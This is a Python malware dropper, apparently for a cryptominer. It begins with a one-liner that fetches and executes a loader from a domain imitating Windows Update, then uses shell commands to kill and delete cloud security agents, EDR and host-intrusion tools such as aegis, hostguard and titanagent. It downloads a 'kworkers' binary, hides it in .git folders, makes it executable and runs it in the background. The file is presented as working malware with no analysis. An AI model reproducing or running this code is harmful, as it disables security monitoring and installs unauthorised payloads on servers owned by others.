# python -c 'import urllib;exec urllib.urlopen("http://m.windowsupdatesupport.org/d/loader.py").read()
import sys
import os
from os.path import expanduser
ver=sys.version


shs='''ps aux | grep -v grep | grep 'aegis' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'hids' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'cloudwalker' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'titanagent' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'edr' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'hids' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'edr' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'cloudwalker' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'titanagent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'sgagent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'barad_agent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'hostguard' | awk '{print $2}' | xargs  -I {}  kill -9 {}

rm -rf /usr/local/aegis
rm -rf /usr/local/qcloud
rm -rf /usr/local/hostguard/bin


ps aux | grep -v grep | grep 'kworkers' | awk '{print $2}' | xargs  -I {}  kill -9 {}

'''
os.system(shs)
domainroota="m.windowsupdatesupport.org"
#domainroota="192.168.67.131"
#$domainroota
#curl  http://$domainroota/d/kworkers -o $gitdir/kworkers


homedir=expanduser("~")
gitdir=""
try:
    os.mkdir(homedir+"/.git")
except Exception as e:
    print(e)
if os.path.isdir(homedir+"/.git"):
    gitdir=homedir+"/.git"


try:
    os.mkdir("./.git")
except Exception as e:
    print(e)
if os.path.isdir("./.git"):
    gitdir="./.git"


downloadu="http://{}/d/kworkers".format(domainroota)
if ver.startswith("3"):
    import urllib.request
    with urllib.request.urlopen(downloadu) as f:
        html = f.read()
        open(gitdir + "/kworkers", 'wb').write(html)
else:
    import urllib2
    with open(gitdir + "/kworkers", 'wb') as f:
        f.write(urllib2.urlopen("http://{}/d/kworkers".format(domainroota)).read())
        f.close()

print ("Download Complete!")
os.system("chmod 777 "+gitdir+"/kworkers")
if os.path.isfile('/.dockerenv'):
    os.system(gitdir+"/kworkers")
else:
    os.system("nohup {}/kworkers >>{}/.log&".format(gitdir,gitdir)